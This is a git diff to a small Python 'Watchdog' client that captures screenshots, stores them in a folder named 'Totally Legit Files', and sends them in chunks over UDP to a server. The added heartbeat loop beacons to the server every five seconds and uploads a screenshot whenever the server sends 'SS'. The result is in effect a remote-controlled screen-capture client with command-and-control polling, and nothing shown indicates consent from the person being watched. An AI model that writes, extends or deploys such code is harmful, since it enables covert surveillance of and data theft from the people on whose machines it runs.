@@ -6,14 +6,15 @@ import socket
 import struct
 import io
 from PIL import Image
+import time
+import subprocess
 
 
-SERVER_IP = "127.0.0.1" #CHANGE THIS OFF LOCAL HOST
+SERVER_IP = "127.0.0.1"
 PORT = 7777 #77 Carson Hocevar
 CHUNK_SIZE = 1400  #Max size is 1500, go a little lower to be safe
-TIMEOUT = 0.04
 FOLDER_PATH = Path("C:/Totally Legit Files") #Path where screenshots will be saved on the client device
-
+SOCK = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 def screeenshot():
 
@@ -32,9 +33,8 @@ def screeenshot():
 
 def send_screenshot(screenshot):
 
-    #Configure socket
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.settimeout(TIMEOUT)
+    #Set timeout to reasonable value
+    SOCK.settimeout(.4)
 
     #Compress ss with pillow
     print(f"Loading and optimizing screenshot")
@@ -61,10 +61,10 @@ def send_screenshot(screenshot):
         #Loop to send this specific packet until it's confirmed
         while True:
             try:
-                sock.sendto(packet, (SERVER_IP, PORT))
+                SOCK.sendto(packet, (SERVER_IP, PORT))
             
                 # Listen for acknowledgement
-                ack_packet, _ = sock.recvfrom(10)
+                ack_packet, _ = SOCK.recvfrom(10)
                 ack_seq, = struct.unpack("!I", ack_packet)
             
                 if ack_seq == pack_num:
@@ -72,7 +72,7 @@ def send_screenshot(screenshot):
                     break
             except socket.timeout:
                 # Didn't survive the journey
-                pass  
+                pass
             
         if eof:
             print(f"Photo sent successfully using {pack_num + 1} UDP packets.")
@@ -80,13 +80,35 @@ def send_screenshot(screenshot):
         
         pack_num += 1
 
-    sock.close()
+def heartbeat():
+
+    
+
+    while True:
+        #set timeout longer to accomodate heartbeat
+        SOCK.settimeout(2)
+
+        SOCK.sendto(b"PING", (SERVER_IP, PORT))
+
+        try:
+            command, _ = SOCK.recvfrom(1024)
+            cmd_str = command.decode()
+
+            if cmd_str != "IDLE":
+                match cmd_str:
+                    case "SS":
+                        SOCK.sendto(b"SS", (SERVER_IP, PORT))
+                        send_screenshot(screeenshot())
+        except socket.timeout:
+            pass
+
+        time.sleep(5)
 
 #shitty main, fix later
 def main():
-    print("Watchdog V0.1, type HELP for help\n")
-    ss = screeenshot()
-    send_screenshot(ss)
+    print("Watchdog Client V0.2, type HELP for help\n")
+    while True:
+        heartbeat()
         
 #RUNGAUURRRRDDDD
 if __name__ == "__main__":
